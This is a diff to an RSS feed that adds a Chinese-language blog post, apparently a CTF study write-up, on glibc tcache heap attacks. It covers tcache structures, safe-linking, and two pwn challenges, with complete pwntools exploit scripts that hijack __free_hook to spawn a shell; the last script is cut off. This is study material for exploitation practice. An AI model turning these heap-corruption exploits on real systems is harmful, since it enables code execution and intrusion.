@@ -3,12 +3,746 @@
     <channel>
         <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
         <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
-        <lastBuildDate>2026-04-06T16:41:08.894Z</lastBuildDate>
+        <lastBuildDate>2026-04-06T20:32:54.680Z</lastBuildDate>
         <description><![CDATA[
         ä¸»é¡µ - åå®¢å­ RSS
     ]]></description>
         <language>zh-cn</language>
         <item>
+    <title><![CDATA[ Tcache attack ]]></title>
+    <link>https://www.cnblogs.com/firefly-star/p/19827526</link>
+    <guid>c106b6b48305e0686b2c69db0fd529d3</guid>
+    <description>
+    <![CDATA[ 
+            <h1 class="postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/firefly-star/p/19827526" title="åå¸äº 2026-04-07 01:41">
+    <span role="heading" aria-level="2">Tcache attack</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                    <div id="cnblogs_post_description" style="display: none">
+        
+        åbinä¹ç®æ¯å­¦å®äºå§...
+    </div>
+<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<h2 id="tcacheçç»æ">Tcacheçç»æ</h2>
+<p>æä»¬ççlibc2.31çæºç å¶ç¸å³çå®ä¹</p>
+<pre><code>#if USE_TCACHE
+/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */#å­é¢ææ
+# define TCACHE_MAX_BINS		64
+# define MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)
+
+/* We overlay this structure on the user-data portion of a chunk when
+   the chunk is stored in the per-thread cache.  */#ææå¤§æ¦å°±æ¯ä»å©ç¨éæ¾åå åçåå­å»å¨å­è¿ä¸ªç»æï¼ä¸ä¼æ°è°ç¨åå­
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+  /* This field exists to detect double frees.  */#åå­é¢ææä¸æ ·ï¼è¿ä¸ªkeyå¼é²æ­¢double free
+  struct tcache_perthread_struct *key;
+} tcache_entry;
+
+/* There is one of these for each thread, which contains the
+   per-thread cache (hence "tcache_perthread_struct").  Keeping
+   overall size low is mildly important.  Note that COUNTS and ENTRIES
+   are redundant (we could have just counted the linked list each
+   time), this is for performance reasons.  */#éè¦çåºè¯¥å°±æ¯è¿ä¸ªtcacheæ¯æ¯ä¸ªçº¿ç¨é½æä¸ä¸ªå§ï¼å¶ä»çåºè¯¥æ¯å­é¢ææ
+typedef struct tcache_perthread_struct
+{
+  uint16_t counts[TCACHE_MAX_BINS];
+  tcache_entry *entries[TCACHE_MAX_BINS];
+} tcache_perthread_struct;
+
+static __thread bool tcache_shutting_down = false;
+static __thread tcache_perthread_struct *tcache = NULL;
+</code></pre>
+<p>TCACHE_MAX_BINSè¿ä¸ªå®å¤§å°è¢«å®ä¹ä¸º64ï¼ä¹å°±æ¯0x40ãæä»¬å¯ä»¥ç®åç®ä¸ä¸tcache_perthread_structç»æçå¤§å°ï¼0x40ä¸ªuint16_tæ°ç»å¤§å°æ¯0x80ï¼æ0x40ä¸ªæåtcache_entryçæéä¹å°±æ¯0x200çå¤§å°åèµ·æ¥ä¹å°±æ¯0x280(å¨libc2.30ä¹åæ¯0x240ï¼åºå«å¨countçå®ä¹ä¸ï¼ä¹åçç±»åæ¯char)ä¸ªå¯ååå­ï¼å®éçå åå¤§å°åºè¯¥æ¯0x290ï¼ä¸é¢æä»¬ççè¿ä¸ªtcacheç»ææ¯æ¾å¨åªçã</p>
+<pre><code>static void
+tcache_init(void)
+{
+  mstate ar_ptr;
+  void *victim = 0;
+  const size_t bytes = sizeof (tcache_perthread_struct);#tcacheç»æçå¤§å°ç»äºbytes
+
+  if (tcache_shutting_down)
+    return;
+
+  arena_get (ar_ptr, bytes);#è·åä¸ä¸ªå¯ç¨ç arena
+  victim = _int_malloc (ar_ptr, bytes);#åéå¯¹åºå¤§å°çåå­ï¼ä¹å°±æ¯0x290
+  if (!victim &amp;&amp; ar_ptr != NULL)#å¦æç¬¬ä¸æ¬¡åéå¤±è´¥å°±åè¯ä¸æ¬¡
+    {
+      ar_ptr = arena_get_retry (ar_ptr, bytes);
+      victim = _int_malloc (ar_ptr, bytes);
+    }
+
+
+  if (ar_ptr != NULL)
+    __libc_lock_unlock (ar_ptr-&gt;mutex);
+
+  /* In a low memory situation, we may not be able to allocate memory
+     - in which case, we just keep trying later.  However, we
+     typically do this very early, so either there is sufficient
+     memory, or there isn't enough memory to do non-trivial
+     allocations anyway.  */#å­é¢ææ
+  if (victim)
+    {
+      tcache = (tcache_perthread_struct *) victim;#æå¯¹åºåå­çæéç»tcache
+      memset (tcache, 0, sizeof (tcache_perthread_struct));#æè¿æ®µåå­æ¸é¶
+    }
+
+}
+</code></pre>
+<p>ååé¢çé¨åæå°±åç¨å®è§çè§åº¦è®²è®²å§ï¼åä¸ç»åæºç è®²äºï¼tcacheçé¾è¡¨çå åå¤§å°ä»0x20ä¸ç´å°0x410ï¼ä¸å±0x40ä¸ªå åï¼ç¬¦åæä»¬å¨ä¸é¢çè§çå®å®ä¹ï¼å¦æå¤§äºè¿ä¸ªèå´é£å°±ä¸ä¼è¿tcacheï¼å¹¶ä¸æ¯ä¸ªé¾è¡¨çå åæå¤§åªæ7ä¸ªï¼æ¯å¦0x20ä¸ªå åï¼ä»æå¤å¨å­7ä¸ª0x20å¤§å°çå ï¼å©ä¸å¦æè¿æï¼é£å°±ä¸ä¼è¿tcacheãå¦å¤è¿è¦æ³¨æçå°±æ¯ï¼å¨libc2.41ä¹åcallocç³è¯·å åæ¯ä¸ä¼èµ°tcacheçï¼ä¹å°±æ¯å¦æcallocç³è¯·å åï¼ä»ä¼ç´æ¥ç³è¯·å¶ä»binä¸­å¯¹åºçå æç´æ¥ä»top chunkéåå²ãè¿æå°±æ¯ä»çnextæéæ¯ç´æ¥æåä¸ä¸ä¸ªå åçnextæé(ä¹å°±æ¯ä¸ä¸ä¸ªå åçå¯åå°åèä¸æ¯å åå¤´)</p>
+<p>å¶ä»ç¹æ§åºæ¬ä¸fastbinç¸åï¼ååé¾è¡¨ï¼åè¿ååºï¼å¤´ææ³ãè¦æ³¨æçå°±æ¯å¨libc2.28ä¹åtcacheæ²¡æé£ä¸ªkeyå¼ï¼æä»¥å¯ä»¥éædouble freeï¼åé¢åå³é®ä¸ç¹çè½¬åå°±æ¯2.32çsafelinkingæºå¶äºï¼safelinkingç®åæ¥è¯´å°±æ¯å¯¹nextæéè¿è¡äºå å¯ï¼ä¸è½ç´æ¥æ¹æå /ç®æ å°åäºï¼ä»çå å¯è¿ç¨çä»£ç å¦ä¸</p>
+<pre><code>#define PROTECT_PTR(pos, ptr) \
+((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
+
+</code></pre>
+<p>å°±æ¯<mark>å å¯å¼ = nextåæ¬æåçå°å ^ (nextæéçå°å&gt;&gt; 12)</mark>nextåæ¬åºè¯¥æåçå°åå°±æ¯ä¸ä¸ä¸ªå åçå°åï¼æä»¥å¨æsafelinkingçæ¶åæä»¬æ»å»å°±è¿éè¦æ³é²å å°åã</p>
+<h2 id="æ»å»">æ»å»</h2>
+<p>æ»å»æä¸¤ç§å¤§æ¹åï¼ç¬¬ä¸ç§æ¯éè¿uafï¼å æº¢åºï¼off by one/null + overlapç´æ¥æ¹nextæéï¼å¨libc2.32åæä»¬åªéè¦freeå¤§å°ç¸åçå åaï¼freeå åbç¶åä¿®æ¹bå åçnextæéæ¹æç®æ å°åå³å¯ï¼ä¸éè¦å¨ç®æ å°åä¼ªé å åï¼è2.32åå°±éè¦ä¼ªé å¤§å°äºãç¬¬äºç§æ¯unlinkå¨smallbinçå åæ¾å¥tcacheæ¶ï¼å ä¸ºä»åªæ£æµç¬¬ä¸ä¸ªå åçåæ³æ§ï¼æ²¡ææ£æ¥å¶ä»å åï¼æä»¥åªè¦ä¿®æ¹ç¬¬ä¸ä¸ªå åçbkæéç³è¯·ä»»æå°åäºãä¸é¢æè¿æ¯æ¼ç¤ºä¸ä¸æ»å»</p>
+<h4 id="polarctf-unk">polarctf-unk</h4>
+<p>å ä¸ºè¿é¢æ¼æ´å¾å¤å°±æ¿æ¥ç»æäºå¯ä»¥å»é¶åºä¸è½½ï¼å»pwné£ä¸ªæ¹åæä¸ä¸å°±å¥½(è¿ç¨æ¯2.23)<a href="https://www.polarctf.com/#/page/challenges" target="_blank" rel="noopener nofollow">PolarD&amp;N</a>ï¼æä»¬åpatchelfä¸ä¸æè¿ä¸ªç¯å¢è®¾ç½®æ2.31çãè¿é¢å°±æ¯æuafï¼æå æº¢åºï¼å¯ä»¥showï¼ä»¥åéæç³è¯·ä»»æå¤§å°çå åãææåç¼è¯çä»£ç è´´åºæ¥ã</p>
+<pre><code>int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  setbuf(stdin, 0);
+  setbuf(stdout, 0);
+  setbuf(stderr, 0);
+  while ( 1 )
+  {
+    menu();
+    switch ( get_num() )
+    {
+      case 1:
+        add_chunk();
+        break;
+      case 2:
+        delete_chunk();
+        break;
+      case 3:
+        edit_chunk();
+        break;
+      case 4:
+        show_chunk();
+        break;
+      case 5:
+        exit(0);
+      default:
+        puts("invalid choice.");
+        break;
+    }
+  }
+</code></pre>
+<p>menuå°±æ¯æå°ä¸äºæç¤º</p>
+<pre><code>int __cdecl get_num()
+{
+  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
+  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  read(0, buf, 0x10u);
+  return atoi(buf);
+}
+void __cdecl add_chunk()
+{
+  int index; // [rsp+8h] [rbp-8h]
+  int size; // [rsp+Ch] [rbp-4h]
+
+  puts("index:");
+  index = get_num();
+  puts("size:");
+  size = get_num();
+  chunk_list[index] = (char *)malloc(size);
+}
+void __cdecl delete_chunk()
+{
+  int index; // [rsp+Ch] [rbp-4h]
+
+  puts("index:");
+  index = get_num();
+  free(chunk_list[index]);
+}
+void __cdecl edit_chunk()
+{
+  int index; // [rsp+8h] [rbp-8h]
+  int length; // [rsp+Ch] [rbp-4h]
+
+  puts("index:");
+  index = get_num();
+  puts("length:");
+  length = get_num();
+  puts("content:");
+  read(0, chunk_list[index], length);
+}
+void __cdecl show_chunk()
+{
+  int index; // [rsp+Ch] [rbp-4h]
+
+  puts("index:");
+  index = get_num();
+  puts(chunk_list[index]);
+}
+
+</code></pre>
+<p>æè·¯å°±æ¯åç³è¯·ä¸ä¸ªå¤§äº0x410çå åè¿unsortedbinæ³é²libcå°åï¼ç¶åfreeä¸ä¸ªå åï¼freeç¬¬äºä¸ªå åï¼æ¹ç¬¬äºä¸ªå åçnextæéä¸ºfreehookï¼ç³è¯·ä¸¤ä¸ç³è¯·å°freehookçå°åï¼ç¶åå¾ä¸ä¸ªå åéåä¸ä¸ª/bin/sh\x00å­ç¬¦ä¸²ï¼freeæè¿ä¸ªå åå³å¯getshell</p>
+<p>æéççæ¬æ¯2.31-0ubuntu9.18ï¼expå¦ä¸ï¼</p>
+<pre><code>#!/usr/bin/env python3
+from pwn import *
+import sys
+from ctypes import *
+#from pwncli import *
+# cli_script()
+#from ae64 import AE64
+#from pymao import *
+context.log_level='debug'
+context.arch='amd64'
+elf=ELF('./pwn')
+libc = ELF('./libc.so.6')
+# libc1=cdll.LoadLibrary('./libc.so.6')
+li='./libc.so.6'
+flag = 0
+if flag:
+    p = remote('1')
+else:
+    p = process('./pwn')
+sa = lambda s,n : p.sendafter(s,n)
+sla = lambda s,n : p.sendlineafter(s,n)
+sl = lambda s : p.sendline(s)
+slr = lambda s : p.sendline(str(s))
+sd = lambda s : p.send(s)
+sdr = lambda s : p.send(str(s).encode())
+rc = lambda n : p.recv(n)
+ru = lambda s : p.recvuntil(s)
+ti = lambda : p.interactive()
+rcl = lambda : p.recvline()
+leak = lambda name,addr :log.success(name+"---&gt;"+hex(addr))
+u6 = lambda a : u64(rc(a).ljust(8,b'\x00').strip())
+i6 = lambda a : int(a,16)
+def csu():
+    pay=p64(0)+p64(0)+p64(1)
+    return pay
+def ph(s):
+    print(hex(s))
+def dbg():
+    # context.terminal = ['tmux', 'splitw', '-h']
+    gdb.attach(p)#maybe gdbscript='set debug-file-directory ./star'
+    pause()
+def add(s,a):
+    ru(b"choice:")
+    sdr(1)
+    ru(b"index:")
+    sdr(s)
+    ru(b"size:")
+    sdr(a)
+def free(s):
+    ru(b"choice:")
+    sdr(2)
+    ru(b"index:")
+    sdr(s)
+def edit(s,a,d):
+    ru(b"choice:")
+    sdr(3)
+    ru(b"index:")
+    sdr(s)
+    ru(b"length:")
+    sdr(a)
+    ru(b"content:")
+    sd(d)
+def show(s):
+    ru(b"choice:")
+    sdr(4)
+    ru(b"index:")
+    sdr(s)
+add(0,0x410)
+add(1,0x20)
+free(0)
+add(0,0x20)
+show(0)
+rcl()
+libcbase=u6(6)-0x1ecfd0
+ph(libcbase)
+fh=libcbase+libc.sym['__free_hook']
+sy=libcbase+libc.sym['system']
+free(0)
+free(1)
+edit(1,0x8,p64(fh))
+add(0,0x20)
+add(1,0x20)
+edit(1,8,p64(sy))
+edit(0,8,b'/bin/sh\x00')
+free(0)
+ti()
+</code></pre>
+<p>æ¥ä¸æ¥patchelfæ¹æ2.32ç¶ååæä¸éï¼ççsafelinkingæä¹ç»è¿ï¼æéççæ¬æ¯2.32-0ubuntu3_amd64ï¼è¿éæä¸¤ç§ç»è¿åæ³ï¼å ä¸ºæè¿éå¯ä»¥è¿unsortedbinï¼å ä¸ºsafelinkingä¸å¨unsortedbinçæï¼æä»¥è¿éæä»¬ç´æ¥å°±å¯ä»¥æå å°åï¼ç®åºæ¥åç§»å^å³å¯</p>
+<pre><code>#!/usr/bin/env python3
+from pwn import *
+import sys
+from ctypes import *
+#from pwncli import *
+# cli_script()
+#from ae64 import AE64
+#from pymao import *
+context.log_level='debug'
+context.arch='amd64'
+elf=ELF('./pwn')
+libc = ELF('./libc.so.6')
+# libc1=cdll.LoadLibrary('./libc.so.6')
+li='./libc.so.6'
+flag = 0
+if flag:
+    p = remote('1')
+else:
+    p = process('./pwn')
+sa = lambda s,n : p.sendafter(s,n)
+sla = lambda s,n : p.sendlineafter(s,n)
+sl = lambda s : p.sendline(s)
+slr = lambda s : p.sendline(str(s))
+sd = lambda s : p.send(s)
+sdr = lambda s : p.send(str(s).encode())
+rc = lambda n : p.recv(n)
+ru = lambda s : p.recvuntil(s)
+ti = lambda : p.interactive()
+rcl = lambda : p.recvline()
+leak = lambda name,addr :log.success(name+"---&gt;"+hex(addr))
+u6 = lambda a : u64(rc(a).ljust(8,b'\x00').strip())
+i6 = lambda a : int(a,16)
+def csu():
+    pay=p64(0)+p64(0)+p64(1)
+    return pay
+def ph(s):
+    print(hex(s))
+def dbg():
+    # context.terminal = ['tmux', 'splitw', '-h']
+    gdb.attach(p)#maybe gdbscript='set debug-file-directory ./star'
+    pause()
+def add(s,a):
+    ru(b"choice:")
+    sdr(1)
+    ru(b"index:")
+    sdr(s)
+    ru(b"size:")
+    sdr(a)
+def free(s):
+    ru(b"choice:")
+    sdr(2)
+    ru(b"index:")
+    sdr(s)
+def edit(s,a,d):
+    ru(b"choice:")
+    sdr(3)
+    ru(b"index:")
+    sdr(s)
+    ru(b"length:")
+    sdr(a)
+    ru(b"content:")
+    sd(d)
+def show(s):
+    ru(b"choice:")
+    sdr(4)
+    ru(b"index:")
+    sdr(s)
+add(0,0x410)
+add(1,0x20)
+free(0)
+add(0,0x20)
+show(0)
+rcl()
+libcbase=u6(6)-0x1e3ff0
+ph(libcbase)
+edit(0,0x10,b'b'*0x10)
+show(0)
+ru(0x10*b'b')
+heap=u6(4)+0x430
+ph(heap)
+fh=libcbase+libc.sym['__free_hook']
+sy=libcbase+libc.sym['system']
+free(0)
+free(1)
+ph(fh)
+dbg()
+edit(1,0x8,p64(fh^(heap&gt;&gt;12)))
+add(0,0x20)
+add(1,0x20)
+edit(1,8,p64(sy))
+edit(0,8,b'/bin/sh\x00')
+free(0)
+ti()
+</code></pre>
+<p>ç¬¬äºç§åæ³å°±æ¯ä¸ç¨unsortedbinæ³é²ï¼ç´æ¥ç¨tcacheæ³é²ãåªéè¦å¨ç¬¬ä¸æ¬¡å åè¿å¥ä¹åshowä¸æ¬¡å³å¯ï¼ä¸ºä»ä¹ï¼å ä¸ºç¬¬ä¸æ¬¡è¿å¥æ¶ç¬¬ä¸ä¸ªå åçnextæéæ¯æ²¡å¼çï¼ä¹å°±æ¯0ï¼0^(nextæéçå°å&gt;&gt;12)è¿ä¸ªå¼å°±æ¯nextæéçå°å&gt;&gt;12ï¼æä»¬&lt;&lt;12å°±æ¯ä¸ä¸ªå å°å(ä½æ¯ä¸è¬ä¸æ¯nextæéçå°åï¼äºï¼å½ç¶å¦æä¸éè¦å å°åçè¯ä¹å¯ä»¥ç´æ¥æ¿æ¥å¼æã</p>
+<p>2.32çexpå¦ä¸</p>
+<pre><code>#!/usr/bin/env python3
+from pwn import *
+import sys
+from ctypes import *
+#from pwncli import *
+# cli_script()
+#from ae64 import AE64
+#from pymao import *
+context.log_level='debug'
+context.arch='amd64'
+elf=ELF('./pwn')
+libc = ELF('./libc.so.6')
+# libc1=cdll.LoadLibrary('./libc.so.6')
+li='./libc.so.6'
+flag = 0
+if flag:
+    p = remote('1')
+else:
+    p = process('./pwn')
+sa = lambda s,n : p.sendafter(s,n)
+sla = lambda s,n : p.sendlineafter(s,n)
+sl = lambda s : p.sendline(s)
+slr = lambda s : p.sendline(str(s))
+sd = lambda s : p.send(s)
+sdr = lambda s : p.send(str(s).encode())
+rc = lambda n : p.recv(n)
+ru = lambda s : p.recvuntil(s)
+ti = lambda : p.interactive()
+rcl = lambda : p.recvline()
+leak = lambda name,addr :log.success(name+"---&gt;"+hex(addr))
+u6 = lambda a : u64(rc(a).ljust(8,b'\x00').strip())
+i6 = lambda a : int(a,16)
+def csu():
+    pay=p64(0)+p64(0)+p64(1)
+    return pay
+def ph(s):
+    print(hex(s))
+def dbg():
+    # context.terminal = ['tmux', 'splitw', '-h']
+    gdb.attach(p)#maybe gdbscript='set debug-file-directory ./star'
+    pause()
+def add(s,a):
+    ru(b"choice:")
+    sdr(1)
+    ru(b"index:")
+    sdr(s)
+    ru(b"size:")
+    sdr(a)
+def free(s):
+    ru(b"choice:")
+    sdr(2)
+    ru(b"index:")
+    sdr(s)
+def edit(s,a,d):
+    ru(b"choice:")
+    sdr(3)
+    ru(b"index:")
+    sdr(s)
+    ru(b"length:")
+    sdr(a)
+    ru(b"content:")
+    sd(d)
+def show(s):
+    ru(b"choice:")
+    sdr(4)
+    ru(b"index:")
+    sdr(s)
+add(0,0x410)
+add(1,0x20)
+free(0)
+add(0,0x20)
+show(0)
+rcl()
+libcbase=u6(6)-0x1e3ff0
+ph(libcbase)
+fh=libcbase+libc.sym['__free_hook']
+sy=libcbase+libc.sym['system']
+free(0)
+show(0)
+rcl()
+heap=u6(3)
+ph(heap)
+free(1)
+edit(1,0x8,p64(fh^(heap)))
+add(0,0x20)
+add(1,0x20)
+edit(1,8,p64(sy))
+edit(0,8,b'/bin/sh\x00')
+free(0)
+ti()
+</code></pre>
+<p>ä¸é¢æä»¬æ¥çä¸éè·tcacheç»æç¸å³çé¢ã</p>
+<h4 id="tcacheç»æç¸å³çé¢">tcacheç»æç¸å³çé¢</h4>
+<p>è¿é¢ç»ä¸ætcacheçææ¥äºä¸ä¸ªå¤§å¤§çéæ¼ï¼ç´æ¥æè¶³æ æªï¼å¶å®è¿æ¯æºç®åçä½æ¯æ¯è¾çå¸å±ï¼libcçæ¬æ¯2.31ï¼ä¿æ¤å¨å¼ãä¼ªä»£ç æå°±è´´å¨ä¸é¢äº</p>
+<pre><code>int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int n3; // eax
+
+  init_data(argc, argv, envp);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      n3 = menu();
+      if ( n3 != 3 )
+        break;
+      show();
+    }
+    if ( n3 &gt; 3 )
+    {
+LABEL_10:
+      puts("something wrong!");
+    }
+    else if ( n3 == 1 )
+    {
+      add();
+    }
+    else
+    {
+      if ( n3 != 2 )
+        goto LABEL_10;
+      delete();
+    }
+  }
+}
+</code></pre>
+<p>æ®éçèåï¼æ²¡ä»ä¹å¥½è¯´ç</p>
+<pre><code>int menu()
+{
+  char nptr[8]; // [rsp+0h] [rbp-10h] BYREF
+  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  puts("Ez_N0t3_B00k?");
+  puts("1.add");
+  puts("2.dele");
+  puts("3.show");
+  puts("4.exit");
+  puts("plz input:");
+  input(nptr, 8);
+  return atoi(nptr);
+}
+__int64 __fastcall input(void *p_nptr, __int64 n8)
+{
+  int v3; // [rsp+1Ch] [rbp-4h]
+
+  v3 = read(0, p_nptr, (unsigned int)n8);
+  if ( v3 &lt; 0 )
+  {
+    puts("error");
+    exit(-1);
+  }
+  return (unsigned int)v3;
+}
+</code></pre>
+<p>è¿ä¸ªinputæ¯æ²¡æoff by one/nullç</p>
+<pre><code>__int64 show()
+{
+  int n4; // [rsp+Ch] [rbp-14h]
+  char nptr[8]; // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  puts("index:");
+  input(nptr, 8);
+  n4 = atoi(nptr);
+  if ( n4 &gt; 4 )
+  {
+    puts("index error");
+    exit(-1);
+  }
+  if ( *(&amp;heap + n4) )
+  {
+    puts("content:");
+    write(1, *(*(&amp;heap + n4) + 8LL), **(&amp;heap + n4));
+  }
+  else
+  {
+    puts("error");
+  }
+  return 0;
+}
+</code></pre>
+<p>è¾å¥3è¿å¥showï¼è¿éççå¥½åæä¸ä¸ªæ°ç»è¶çï¼ä½å¶å®æ¯æ²¡æçï¼å¯ä»¥çæ±ç¼</p>
+<pre><code>.text:0000000000001751                 mov     [rbp+var_14], eax
+.text:0000000000001754                 cmp     [rbp+var_14], 0
+.text:0000000000001758                 js      short loc_1760
+.text:000000000000175A                 cmp     [rbp+var_14], 4
+.text:000000000000175E                 jle     short loc_1776
+</code></pre>
+<p>è¿éæä¸¤ä¸ªè·³è½¬ç¬¬ä¸ä¸ªæ¯JSå¦æä¸ºè´æ°å°±ä¼ç´æ¥è·³è½¬äºï¼æä»¥æ¯ä¸è½æ°ç»è¶ççã</p>
+<pre><code>__int64 add()
+{
+  int n4; // [rsp+8h] [rbp-18h]
+  unsigned int size; // [rsp+Ch] [rbp-14h]
+  char size_4; // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  for ( n4 = 0; n4 &lt;= 4 &amp;&amp; *(&amp;heap + n4); ++n4 )
+    ;
+  if ( n4 == 5 )
+  {
+    puts("No space!");
+    return 0;
+  }
+  else
+  {
+    puts("length:");
+    input(&amp;size_4, 8);
+    size = atoi(&amp;size_4);
+    if ( size &lt;= 0x25F || size &gt; 0x300 )
+    {
+      puts("No size like that!");
+      exit(-1);
+    }
+    *(&amp;heap + n4) = malloc(0x20u);
+    **(&amp;heap + n4) = size;
+    *(*(&amp;heap + n4) + 8LL) = malloc(size);
+    puts("content:");
+    read(0, *(*(&amp;heap + n4) + 8LL), size - 1);
+    printf("What's this:%ld\n", *(*(&amp;heap + n4) + 8LL) &amp; 0xFFFLL);
+    return 0;
+  }
+}
+</code></pre>
+<p>è¾å¥1è¿å¥addï¼malloc(0x20)ç¸å½äºåå»ºäºä¸ªç»æä½userdataçä½ç½®æ¯size(ä¹å°±æ¯freeåå åfdæéçä½ç½®)ï¼userdata+8çä½ç½®æ¯æä»¬çæ­£è½æ§å¶ç³è¯·å¤§å°å åçä½ç½®(ä¹å°±æ¯freeåå åbkæéçä½ç½®)ï¼è¿éè¿æç³è¯·çå¤§å°éå¶ï¼ç®åæ¥çæ¯æ²¡ææ¼æ´çã</p>
+<pre><code>__int64 delete()
+{
+  int n4; // [rsp+Ch] [rbp-14h]
+  char nptr[8]; // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  puts("index:");
+  input(nptr, 8);
+  n4 = atoi(nptr);
+  if ( n4 &gt; 4 )
+  {
+    puts("index error");
+    exit(-1);
+  }
+  if ( *(&amp;heap + n4) )
+  {
+    free(*(&amp;heap + n4));
+    free(*(*(&amp;heap + n4) + 8LL));
+    **(&amp;heap + n4) = 0;
+    *(*(&amp;heap + n4) + 8LL) = 0;
+    *(&amp;heap + n4) = 0;
+  }
+  else
+  {
+    puts("error");
+  }
+  return 0;
+}
+</code></pre>
+<p>é2è¿å¥deleteå½æ°ï¼è¿éä¹ä¸çä¹æ²¡ææ¼æ´åï¼ä¸æ¯å¾å¥½çæ¸é¶äºä¹ï¼ç¡®å®æ²¡æç®åçUAFäºï¼ç¶åä¸»ç¨åºä¹æ²¡æå¶ä»å½æ°äºï¼æ²¡æeditå½æ°ãé£æ¥ä¸æ¥æä¹åäºå¢ï¼è¿éå¶å®æ¯æä¸ä¸ªUAFæ¼æ´çï¼æ¼æ´å°±å¨ä»åfree(*(&amp;heap + n4));ï¼å free( *( *(&amp;heap + n4) + 8LL));è¿å°±ä¼äº§çä¸ä¸ªé®é¢ï¼ä»åfreeæè¿ä¸ªç»æä½çå°åçå å(å°±åå«å åaå§)ï¼åfreeæaè¿ä¸ªå åbkæéä½ç½®çå åãä»å¿è®°äºä¸ä¸ªå åfreeä¹åï¼ä»çfdï¼bkæéä½ç½®çå¼æ¯ä¼è¢«èµå¼çï¼èè¿ä¸ªå åaçå¤§å°æ¯0x20ï¼ä¼è¿tcacheï¼èæä»¬ä¸é¢è®²äºtcacheè¿ä¸ªç»æä¹æ¯ä¸ä¸ªå å(å¤§å°æ¯0x280)ï¼è¿æ ·ä»å°±è«åå¶å¦å¸®æä»¬ætcacheç»æä½éæ¾äºï¼æä»¬å¦æåç³è¯·ä¸ä¸ªç±»ä¼¼å¤§å°çå åå°±å¯ä»¥å¾tcacheç»æä½éåå¼ï¼ç´æ¥å¯ä»¥ä»»æå°åç³è¯·å åäºãä½è¿é¢å¼äºpieå¯¼è´æ²¡é£ä¹ç®ååï¼ä½æ¯éè¦æ³¨æçæ¯ï¼æä»¬ç³è¯·å åä¸è¦ææ´ä¸ªå åçç»æç ´åäºï¼ä¸ç¶ä¼æ¥éã</p>
+<p>å¤§é¢æè·¯å°±æ¯åå¾å°å å°åï¼è¦å¸å±ä¸ä¸ªå åä½¿å¶çæéæåtcache_perthread_structï¼æ¹tcache_perthread_structæcountæ¹æ7ä»¥ä¸ä¿è¯tcache_perthread_structè¿å¥unsortedbinï¼ç´æ¥showå¦ä¸ä¸ªå åæ³é²åºlibcåºå°åï¼åé¢åæ¹tcache_perthread_structè®©0x30çé¾è¡¨åæä»¬ç³è¯·å åå¤§å°çé¾è¡¨å½¢æä¸ä¸ªoverlappingï¼ç¶åå¨0x30é¾è¡¨çå åä¸ååºæ¥ä¸ä¸ª/bin/sh\x00ï¼åæ¹tcache_perthread_structåé¢å¨æä»¬ç³è¯·çå åå¤§å°çé¾è¡¨ä¸æ¾ä¸freehookï¼ç¶åç³è¯·åºæ¥åæsystemï¼æåfreeæä»¬ååºæ¥äº/bin/sh\x00å­ç¬¦ä¸²çå åå³å¯getshll</p>
+<p>expå¦ä¸</p>
+<pre><code>#!/usr/bin/env python3
+from pwn import *
+import sys
+from ctypes import *
+from pwncli import *
+# cli_script()
+#from ae64 import AE64
+#from pymao import *
+context.log_level='debug'
+context.arch='amd64'
+elf=ELF('./pwn')
+libc = ELF('./libc.so.6')
+# libc1=cdll.LoadLibrary('./libc.so.6')
+li='./libc.so.6'
+flag = 0
+if flag:
+    p = remote('1')
+else:
+    p = process('./pwn')
+sa = lambda s,n : p.sendafter(s,n)
+sla = lambda s,n : p.sendlineafter(s,n)
+sl = lambda s : p.sendline(s)
+slr = lambda s : p.sendline(str(s))
+sd = lambda s : p.send(s)
+sdr = lambda s : p.send(str(s).encode())
+rc = lambda n : p.recv(n)
+ru = lambda s : p.recvuntil(s)
+ti = lambda : p.interactive()
+rcl = lambda : p.recvline()
+leak = lambda name,addr :log.success(name+"---&gt;"+hex(addr))
+u6 = lambda a : u64(rc(a).ljust(8,b'\x00').strip())
+i6 = lambda a : int(a,16)
+def csu():
+    pay=p64(0)+p64(0)+p64(1)
+    return pay
+def ph(s):
+    print(hex(s))
+def dbg():
+    # context.terminal = ['tmux', 'splitw', '-h']
+    gdb.attach(p)#maybe gdbscript='set debug-file-directory ./star'
+    pause()
+def add(s,a):
+    ru(b"plz input:")
+    slr(1)
+    ru(b"length:")
+    slr(s)
+    ru(b"content:")
+    sd(a)
+def free(s):
+    ru(b"plz input:")
+    slr(2)
+    ru(b"index:")
+    sdr(s)
+def show(s):
+    ru(b"plz input:")
+    slr(3)
+    ru(b"index:")
+    slr(s)
+    ru(b"content:\n")
+add(0x300,b'b')
+free(0)
+add(0x280,b'7')
+show(0)
+rc(0x88)
+heap=u6(7)
+ph(heap)
+free(0)
+tar1=heap-0x2a0
+tar=heap+0x390
+pay=p16(7)*0x40+p64(tar)*0x2c+p64(tar1)*0x14
+add(0x280,pay)
+add(0x2e0,p64(0)+p64(0x291))
+free(0)
+show(1)
+rc(0x18)
+libcbase=u6(6)-0x1dcbe0-0x10000
+sy=libcbase+libc.sym['system']
+fh=libcbase+libc.sym['__free_hook']
+ph(libcbase)
+ta=heap+0x10
